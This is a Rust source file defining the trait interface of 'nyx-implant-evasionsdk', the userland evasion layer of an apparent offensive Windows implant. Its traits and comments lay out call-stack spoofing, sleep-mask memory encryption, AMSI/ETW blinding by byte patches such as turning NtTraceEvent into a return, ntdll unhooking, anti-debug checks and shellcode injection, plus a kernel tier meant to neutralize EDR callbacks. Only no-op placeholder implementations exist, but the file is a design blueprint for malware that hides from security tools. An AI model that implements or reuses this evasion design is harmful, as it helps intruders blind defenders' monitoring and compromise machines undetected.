//! nyx-implant-evasionsdk — userland (PIC-implant) evasion kit seams (P2.1+).
//!
//! **Symmetric counterpart to `nyx-operator-kernelsdk`.** This crate is the
//! canonical, *exhaustive* userland evasion seam surface; every pluggable
//! userland evasion capability is a Rust trait with a no-op floor default.
//! Real implementations plug in as `impl Trait for …` in `implant-win` (or
//! future implant variants) and are selected at build/init time — adding an
//! impl never edits these traits or the call sites. Same contract as the
//! implant's existing `kits.rs` (`SleepmaskKit`/`ProcessInjectKit`), which is
//! the current minimal subset and will migrate to depend on this crate.
//!
//! ## Why its own crate
//! - `#![no_std]` + platform-agnostic trait defs → **type-checks with full
//!   content on the dev host** (no Windows toolchain needed to iterate seams).
//! - Symmetric to the kernel tier (`operator-kernelsdk`): userland seams here,
//!   kernel seams there, a clean two-tier composition contract between them.
//! - Reusable across `implant-win` and any future implant variant.
//!
//! ## The two-tier model
//! ```text
//!   EvasionStack  (this crate — runs INSIDE the PIC implant, no_std)
//!   ├─ SyscallSource      indirect syscalls / SSN  (foundation; see nyx_evasion)
//!   ├─ PdataGapScanner    .pdata gap/ghost enum    (foundation for spoof + sleepmask)
//!   ├─ StackSpoofKit      BYOUD-Gap / LACUNA       (per sensitive call)
//!   ├─ SleepmaskKit       Ekko / Foliage / InsomniacUnwinding (mask→sleep→unmask)
//!   ├─ MemoryMaskKit      encrypt + RW↔RX flip / Memory-Bouncing (beats FluctuationMonitor)
//!   ├─ BlindKit           AMSI / ETW userland blind (byte-patch / HW-BP patchless / forge)
//!   ├─ UnhookKit          KnownDlls fresh-map / disk fallback
//!   ├─ AntiDebugKit       PEB / ProcessDebugPort / timing
//!   └─ ProcessInjectKit   module stomping / threadless / BYORWXDLL
//!
//!   KernelTier    (nyx-operator-kernelsdk — operator-side, NOT in the implant)
//!   ├─ KernelRw → EtwTiKit · CallbackKit · MiniFilterKit · WfpKit ·
//!   │             PatchGuardKit · ProcHideKit · PplKit · EdrNeutralizeKit · CredKit
//! ```
//! **Composition contract:** when the kernel tier is live (e.g. ETW-TI blinded,
//! callbacks neutralized), the userland tier may relax the corresponding floor
//! (e.g. `BlindKit` can stay `NoBlind`). When the kernel tier is at its
//! `NoKernel` floor (HVCI-on, no primitive), the userland tier MUST be fully
//! self-sufficient. `EvasionStack.kernel` records the kernel posture so impls
//! can downgrade themselves.
//!
//! ## Status (2026-06)
//! Seams only; no real impls yet. Research-grounded technique lists per trait
//! come from `docs/p2-2026-h2-latest-sweep.md`, `docs/p2-2026-kernel-tier-deepdive.md`,
//! and the root research corpus.

#![cfg_attr(not(test), no_std)]
#![forbid(unsafe_op_in_unsafe_fn)]

extern crate alloc;

/// `.pdata` gap/ghost enumeration — the algorithmic foundation for
/// `StackSpoofKit` (BYOUD-Gap leaf frames) and `InsomniacUnwinding`-class
/// `SleepmaskKit`. Pure Rust, no Windows deps, unit-tested on the dev host.
pub mod gap;
/// BYOUD-Gap / LACUNA-Chain synthetic call-stack frame chain (pure model).
pub mod frame;
/// RC4 stream cipher (sleep-mask memory encryption — `SystemFunction032`).
pub mod rc4;
/// Foliage sleep-mask 10-step APC→NtContinue chain — pure state-machine model.
pub mod foliage;
/// APC / NtContinue chain synthesis — pure model for Foliage/Ekko.
pub mod apc;
/// CET-aware RSP-swap decision — pure logic (pessimistic degrade).
pub mod swap;
/// Cross-version kernel offset table (Win10 1809 → Win11 25H2 + Server).
pub mod offsets_table;

use alloc::boxed::Box;
use alloc::string::String;
use alloc::vec::Vec;
use core::fmt;

// ---- Errors ---------------------------------------------------------------

#[derive(Debug)]
#[non_exhaustive]
pub enum EvasionError {
    /// The kit's floor is active (no real impl wired) — caller should treat the
    /// capability as absent and fall back to the un-evaded path.
    NoFloor(&'static str),
    /// Target structure / address unresolved at runtime (e.g. no .pdata gaps
    /// found on this OS build, module not mapped).
    Unresolved(&'static str),
    /// The current hardware/OS posture forbids this (e.g. CET-on kills a
    /// return-address-mutation spoof → must use a `.pdata`-class impl instead).
    UnsupportedPosture(&'static str),
    /// Kit declined to act (e.g. anti-debug tripped → abort).
    Aborted,
    Other(String),
}

impl fmt::Display for EvasionError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::NoFloor(s) => write!(f, "evasion floor active: {s}"),
            Self::Unresolved(s) => write!(f, "unresolved: {s}"),
            Self::UnsupportedPosture(s) => write!(f, "unsupported posture: {s}"),
            Self::Aborted => f.write_str("evasion aborted"),
            Self::Other(s) => f.write_str(s),
        }
    }
}

/// What the kernel tier is currently doing, surfaced to userland impls so they
/// can downgrade. Mirrors `nyx_operator_kernelsdk::KernelTier` optionality.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq)]
pub struct KernelPosture {
    /// ETW-TI provider blinded kernel-side?
    pub etw_ti_blinded: bool,
    /// Ps/Ob/Cm callbacks neutralized kernel-side?
    pub callbacks_neutralized: bool,
    /// Is HVCI on (limits what ANY tier can do to code pages)?
    pub hvci_on: bool,
    /// Is Intel CET shadow-stack on (kills return-address spoof)?
    pub cet_on: bool,
}
impl KernelPosture {
    /// Unknown / assume worst case: nothing kernel-side done, HVCI+CET on.
    pub fn worst_case() -> Self {
        Self { etw_ti_blinded: false, callbacks_neutralized: false, hvci_on: true, cet_on: true }
    }
}

// ---- Foundation: syscall source -------------------------------------------

/// SSN resolution + the indirect-syscall execution primitive. This is the
/// foundation every sensitive call routes through. The concrete trait already
/// lives in the `nyx_evasion` crate (`SyscallSource`); this alias is the seam
/// contract for the stack so `EvasionStack` is self-contained.
///
/// Planned impls: `HellsGate`/`HalosGate`/`TartarusGate` (shipped) →
/// `RecycledGate`, `SysWhispers4`, `Acheron`, `Sysplant`, `FreshyCalls`.
pub trait SyscallSource {
    /// Resolve (or confirm) the syscall-number table for the live ntdll. Idempotent.
    fn prime(&self) -> Result<(), EvasionError>;
}

// ---- Foundation: .pdata gap scanner ---------------------------------------

/// Enumerate `.pdata` gaps / ghost functions / NOP gaps across the whitelisted
/// DLLs (ntdll / kernelbase / win32u / wow64) at init. Output feeds both
/// `StackSpoofKit` (leaf bridge frames) and `InsomniacUnwinding`-class
/// `SleepmaskKit` (preserve-only-UNWIND_INFO needs the same metadata).
///
/// Impl MUST be pure-read (HVCI/CFG irrelevant). Result is a `GapPool` the
/// other kits borrow.
pub trait PdataGapScanner {
    /// Scan and cache the gap pool. Returns counts per DLL for self-test.
    fn scan(&self) -> Result<GapPool, EvasionError>;
}

/// Cached gap/ghost/NOP addresses, shared by spoof + sleepmask kits. Populated
/// by `PdataGapScanner` (real impl) or `gap::enumerate_gaps` (the pure-Rust
/// core). Held by `EvasionStack::gap_pool`.
pub struct GapPool {
    /// Leaf-frame gap addresses: `RtlLookupFunctionEntry(addr) == NULL` →
    /// unwinder treats as leaf, advances RSP by 8, no shadow-stack touch.
    pub gaps: Vec<usize>,
    /// Ghost-function addresses: real executable code with no `.pdata` entry
    /// (compiler helpers / inlined thunks) — dual-use bridge + exec redirect.
    pub ghosts: Vec<usize>,
    /// NOP / alignment gaps (e.g. win32u 8-byte NOP gaps between syscall stubs).
    pub nops: Vec<usize>,
    /// Tail-padding lacunae: the region after the last `.pdata` entry up to
    /// `SizeOfImage`. Large, contiguous, unwinder-invisible. (LACUNA layer 4)
    pub tails: Vec<usize>,
    /// Backed module-legitimate addresses (real `.pdata`-covered functions in
    /// ntdll/kernelbase). Used as the chain TERMINATOR so the unwinder's final
    /// backed frame resolves to a real signed module — defeats return-address-
    /// in-module validation. (LACUNA layer 5)
    pub backed: Vec<usize>,
}
impl GapPool {
    pub fn gap_count(&self) -> usize { self.gaps.len() }
    pub fn ghost_count(&self) -> usize { self.ghosts.len() }
    pub fn nop_count(&self) -> usize { self.nops.len() }
    /// Total usable leaf-lacuna addresses across all four leaf pools.
    pub fn lacuna_count(&self) -> usize {
        self.gaps.len() + self.ghosts.len() + self.nops.len() + self.tails.len()
    }
    /// True if ANY leaf-lacuna pool is non-empty (relaxed from gaps-only so a
    /// host with only ghosts/nops/tails still produces a usable chain).
    pub fn is_usable(&self) -> bool { self.lacuna_count() > 0 }
}
impl Default for GapPool {
    fn default() -> Self {
        Self {
            gaps: Vec::new(),
            ghosts: Vec::new(),
            nops: Vec::new(),
            tails: Vec::new(),
            backed: Vec::new(),
        }
    }
}

// ---- Execution / memory obfuscation ---------------------------------------

/// Call-stack spoof applied around every sensitive (syscall/API) call. Depends
/// on `PdataGapScanner` + `SyscallSource`. CET-safe variants only — anything
/// mutating RSP-stack return addresses faults under CET.
///
/// Planned impls: `NoSpoof` (floor), `ByoudGap`/`LacunaChain` (zero-.pdata-write,
/// CET-safe — PRIMARY), `VulcanRaven`/`SilentMoonwalk` (CET-OFF fallback only),
/// `LayeredSyscall` (VEH+HWBP, CET-OFF fallback).
pub trait StackSpoofKit {
    /// Enter a spoofed-stack scope for the next sensitive call(s). The returned
    /// guard restores the true stack on `Drop`, so callers write:
    /// `let _g = stack.stack_spoof.enter(&gaps)?; do_sensitive_syscall();`
    /// Object-safe (no generic method) so it can live in `Box<dyn StackSpoofKit>`.
    fn enter(&self, gaps: &GapPool) -> Result<SpoofGuard, EvasionError>;
}

/// RAII scope guard: the spoofed stack is live while this owns it; `Drop`
/// restores the true frame chain. Leaking it leaves the stack spoofed.
///
/// Contains an optional restore closure captured at `enter()` time. When the
/// guard drops, the closure runs — restoring the original RSP / frame chain.
#[must_use = "a dropped SpoofGuard restores the stack; leaking it leaves the spoof in place"]
pub struct SpoofGuard {
    restore: Option<alloc::boxed::Box<dyn FnOnce()>>,
}

impl Drop for SpoofGuard {
    fn drop(&mut self) {
        if let Some(f) = self.restore.take() {
            f();
        }
    }
}

impl SpoofGuard {
    /// Create a guard that runs `restore_fn` on drop.
    pub fn new(restore_fn: impl FnOnce() + 'static) -> Self {
        Self { restore: Some(alloc::boxed::Box::new(restore_fn)) }
    }

    /// No-op guard (floor default — no restore action needed).
    pub fn noop() -> Self {
        Self { restore: None }
    }
}

/// Sleep obfuscation: own the mask → sleep → unmask window. An Ekko/Foliage
/// impl's APC timer IS the sleep (do not split mask/unmask around an external
/// sleep). **Invariant:** on return the image + every thread stack is
/// byte-identical to entry.
///
/// Planned impls: `NoMask` (floor), `Ekko`, `Foliage` (SystemFunction032 RC4 +
/// WaitForSingleObject), `InsomniacUnwinding` (stomp + register .pdata +
/// mask memory only — no spoof-during-sleep, CET-clean), `Zilean`, `DreamWalkers`.
pub trait SleepmaskKit {
    fn sleep_masked(&self, seconds: u32, gaps: &GapPool);
}

/// The memory-content half of sleep obfuscation, separable from the timing
/// primitive. Plain encrypt-on-sleep flips the `EtwTI-FluctuationMonitor`
/// signal; advanced impls beat it.
///
/// Planned impls: `NoMaskMem` (floor), `Rc4SystemFunction032` (image-commit,
/// Moneta-clean), `MemoryFluctuation` (cyclic enc + RW↔RX flip),
/// `MemoryBouncing`/`MemoryHopping` (Naksyn — beats Elastic fluctuation detector).
pub trait MemoryMaskKit {
    /// Encrypt the implant image region in place; returns a token to restore.
    fn mask(&self) -> Result<MaskToken, EvasionError>;
    /// Restore the region the token refers to. MUST run before any code in it.
    fn unmask(&self, token: MaskToken) -> Result<(), EvasionError>;
}
/// Opaque restore handle. `Drop` MUST repair if leaked un-unmasked.
/// Carries the mask parameters (base, len, key) so `unmask` can restore.
#[must_use = "an un-unmasked MaskToken leaves the image encrypted → crash"]
pub struct MaskToken {
    /// Image base address (VA) that was masked.
    pub base: usize,
    /// Length of the masked region in bytes.
    pub len: usize,
    /// RC4 key used for masking (32 bytes).
    pub key: [u8; 32],
}
impl MaskToken {
    /// Construct a token. Only real `MemoryMaskKit` impls call this.
    pub fn new(base: usize, len: usize, key: [u8; 32]) -> Self {
        Self { base, len, key }
    }
}

// ---- Injection (postex) ---------------------------------------------------

/// Spawn-to-shellcode injection into a fresh sacrificial process. Returns a
/// handle on success.
///
/// Planned impls: `NotImpl` (floor), `ModuleStomping` (backed RX, disk-backed),
/// `ThreadlessInject` (hook a regularly-called API, no CreateRemoteThread),
/// `ByorwxDll` (pre-existing RWX region in a signed DLL), `PhantomDll`.
pub trait ProcessInjectKit {
    fn inject(&self, spawn_to: &str, shellcode: &[u8]) -> Result<InjectHandle, EvasionError>;
}
/// Raw HANDLE to the injected thread/process; `0` on the floor.
#[non_exhaustive]
pub struct InjectHandle(pub usize);
impl InjectHandle {
    /// Construct from a raw handle value. The only way for an impl crate
    /// (outside this crate) to build one — `#[non_exhaustive]` forbids the
    /// tuple-struct constructor form externally, so impls use `InjectHandle::new(h)`.
    pub fn new(handle: usize) -> Self {
        Self(handle)
    }
    /// The raw handle value (`0` = no handle / floor).
    pub fn raw(&self) -> usize {
        self.0
    }
}

// ---- Userland telemetry blind --------------------------------------------

/// Userland AMSI/ETW blind. (Kernel ETW-TI blind is operator-side, in
/// `operator-kernelsdk::EtwTiKit`.) `BlindTarget` selects the surface; a single
/// impl may cover several.
///
/// Planned impls: `NoBlind` (floor), `BytePatch` (EtwEventWrite — current,
/// **burning out** in 2026 Defender), `NtTraceEventBytePatch` (byte0→0xC3,
/// covers all EtwEventWrite* — P2.1b), `HwBreakpointPatchless` (Turla Kazuar v3
/// style, DR0–DR3, no byte mod — SOTA), `ClrPatch` (clr.dll!AmsiScanBuffer),
/// `Forge` (inject benign events — Olaf Hartong philosophy).
pub trait BlindKit {
    /// Blind `target` once (idempotent). Managed (.NET/PS) envs need HW-BP class.
    fn blind(&self, target: BlindTarget) -> Result<(), EvasionError>;
}
/// Which userland telemetry surface to blind.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum BlindTarget {
    /// `amsi.dll!AmsiScanBuffer` (burning — prefer ClrPatch/HW-BP).
    Amsi,
    /// `ntdll!EtwEventWrite` (burning — prefer NtTraceEventBytePatch).
    EtwEventWrite,
    /// `ntdll!NtTraceEvent` byte0 → 0xC3 (one patch covers all EtwEventWrite*).
    NtTraceEvent,
    /// `clr.dll!AmsiScanBuffer` (managed-content scan, less watched than amsi.dll).
    Clr,
}

// ---- Self-defense ---------------------------------------------------------

/// Restore pristine ntdll (SSN bytes + clean syscall;ret gadget).
///
/// Planned impls: `KnownDllsFreshMap` (shipped) + `DiskFallback` (shipped),
/// future: combo that re-verifies after blind. Floor: `NoUnhook` (leave as-is).
pub trait UnhookKit {
    fn unhook(&self) -> Result<(), EvasionError>;
}

/// Detect debugger / sandbox / analyzer; returns true → caller aborts/hides.
///
/// Planned impls: `NoAntiDebug` (floor), `PebDebugPort` (BeingDebugged +
/// ProcessDebugPort + uptime — shipped), future: timing, hardware-BP detection.
pub trait AntiDebugKit {
    fn is_being_debugged(&self) -> Result<bool, EvasionError>;
}

// ---- No-op floors ---------------------------------------------------------

/// Bundle of every floor. Used when no real impl is wired so `EvasionStack`
/// still assembles and behaves byte-identically to the un-evaded baseline.
pub struct Floors;

impl SyscallSource for Floors {
    fn prime(&self) -> Result<(), EvasionError> {
        Err(EvasionError::NoFloor("SyscallSource"))
    }
}
impl PdataGapScanner for Floors {
    fn scan(&self) -> Result<GapPool, EvasionError> {
        Err(EvasionError::NoFloor("PdataGapScanner"))
    }
}
impl StackSpoofKit for Floors {
    fn enter(&self, _gaps: &GapPool) -> Result<SpoofGuard, EvasionError> {
        Ok(SpoofGuard::noop())
    }
}
impl SleepmaskKit for Floors {
    // The trait signature returns `()`, so the floor cannot propagate an
    // error. This is an HONEST no-op: it performs no mask and no sleep-window
    // setup — unlike the `Result`-returning floors above/below, which were
    // previously masking "unimplemented" as fake `Ok` success. Callers that
    // need to detect "no sleep mask is wired" should do so via the presence
    // of a real `SleepmaskKit` impl in `EvasionStack`, not by inspecting this
    // call. See ROADMAP "implant-evasionsdk wiring".
    fn sleep_masked(&self, _s: u32, _gaps: &GapPool) {}
}
impl MemoryMaskKit for Floors {
    fn mask(&self) -> Result<MaskToken, EvasionError> {
        Err(EvasionError::NoFloor("MemoryMaskKit"))
    }
    // Previously returned `Ok(())` — falsely claimed the image was decrypted.
    // Now honestly reports that no MemoryMaskKit is wired. Callers MUST handle
    // this (do NOT `?`-propagate into a beacon crash; log and degrade).
    fn unmask(&self, _t: MaskToken) -> Result<(), EvasionError> {
        Err(EvasionError::NoFloor("MemoryMaskKit::unmask"))
    }
}
impl ProcessInjectKit for Floors {
    fn inject(&self, _spawn_to: &str, _sc: &[u8]) -> Result<InjectHandle, EvasionError> {
        Err(EvasionError::NoFloor("ProcessInjectKit"))
    }
}
impl BlindKit for Floors {
    fn blind(&self, _t: BlindTarget) -> Result<(), EvasionError> {
        Err(EvasionError::NoFloor("BlindKit"))
    }
}
impl UnhookKit for Floors {
    fn unhook(&self) -> Result<(), EvasionError> {
        Err(EvasionError::NoFloor("UnhookKit"))
    }
}
impl AntiDebugKit for Floors {
    // Previously returned `Ok(false)` — falsely claimed "not being debugged",
    // hiding the fact that no anti-debug check actually ran. Now honestly
    // reports that no AntiDebugKit is wired. Callers MUST handle this (a real
    // impl is the only source of trustworthy `Ok(bool)`).
    fn is_being_debugged(&self) -> Result<bool, EvasionError> {
        Err(EvasionError::NoFloor("AntiDebugKit"))
    }
}

// ---- EvasionStack assembler ----------------------------------------------

/// The composed userland evasion posture. All fields are trait objects so a
/// build/init swaps any impl without touching call sites. `gap_pool` is shared
/// (scanned once) by spoof + sleepmask. `kernel` records the operator-side
/// kernel tier posture so impls can downgrade (e.g. skip BlindKit if ETW-TI is
/// already blinded kernel-side).
pub struct EvasionStack {
    pub syscall: Box<dyn SyscallSource>,
    pub gaps: Box<dyn PdataGapScanner>,
    pub stack_spoof: Box<dyn StackSpoofKit>,
    pub sleepmask: Box<dyn SleepmaskKit>,
    pub mem_mask: Box<dyn MemoryMaskKit>,
    pub inject: Box<dyn ProcessInjectKit>,
    pub blind: Box<dyn BlindKit>,
    pub unhook: Box<dyn UnhookKit>,
    pub antidebug: Box<dyn AntiDebugKit>,
    /// Cached at init by `gaps.scan()`; borrowed by spoof + sleepmask.
    pub gap_pool: GapPool,
    /// Operator-side kernel posture (set by the operator before beacon start).
    pub kernel: KernelPosture,
}

impl EvasionStack {
    /// All-floor stack: behaves byte-identically to an un-evaded implant.
    /// Every real build replaces the fields it implements.
    pub fn floor() -> Self {
        Self {
            syscall: Box::new(Floors),
            gaps: Box::new(Floors),
            stack_spoof: Box::new(Floors),
            sleepmask: Box::new(Floors),
            mem_mask: Box::new(Floors),
            inject: Box::new(Floors),
            blind: Box::new(Floors),
            unhook: Box::new(Floors),
            antidebug: Box::new(Floors),
            gap_pool: GapPool::default(),
            kernel: KernelPosture::worst_case(),
        }
    }

    /// One-time init: prime syscalls, scan gaps, cache the pool. Must run once
    /// before any sensitive call. Best-effort: a missing scanner leaves
    /// `gap_pool` empty and spoof/sleepmask degrade to their floors.
    pub fn prime(&mut self) -> Result<(), EvasionError> {
        self.syscall.prime()?;
        if let Ok(pool) = self.gaps.scan() {
            self.gap_pool = pool;
        }
        Ok(())
    }
}

/// Private re-export of the ETW-TI provider GUID for the blind module's
/// provider-disable companion. Not part of the public seam API.
#[doc(hidden)]
pub mod __private {
    /// Microsoft-Windows-Threat-Intelligence provider GUID.
    pub const ETW_TI_GUID: [u8; 16] = [
        0x7C, 0x89, 0xE1, 0xF4, 0x5D, 0xBB, 0x68, 0x56,
        0xF1, 0xD8, 0x04, 0x0F, 0x4D, 0x8D, 0xD3, 0x44,
    ];
}
